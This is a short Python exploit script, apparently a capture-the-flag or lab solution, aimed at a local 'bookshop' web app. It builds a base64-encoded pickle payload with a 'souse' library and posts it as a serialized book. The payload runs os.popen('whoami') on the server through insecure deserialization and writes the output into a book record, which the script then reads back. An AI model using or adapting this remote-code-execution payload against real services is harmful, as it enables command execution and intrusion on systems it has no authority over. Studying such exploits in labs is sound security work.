import sys
import os
import requests
import base64

sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "souse")))

from souse import API

url = "http://127.0.0.1:8888/"

exp = """
from __main__ import bookshop
bookshop.books[0].uuid = "0c47a07a-b0a6-4eaa-91c7-ec9050220f02"

import os
bookshop.books[0].name = os.popen("whoami").read()
"""

print(
    requests.post(
        url+"/books/create",
        data={
            "name": "test",
            "species": "species",
        },
    ).text
)

print(
    requests.post(
        url,
        data={
            "action": "check_book",
            "serialized_book": API(exp, transfer="b64").generate(),
        },
    ).text
)

print(
    requests.get(
        url+"/books/0c47a07a-b0a6-4eaa-91c7-ec9050220f02",
    ).text
)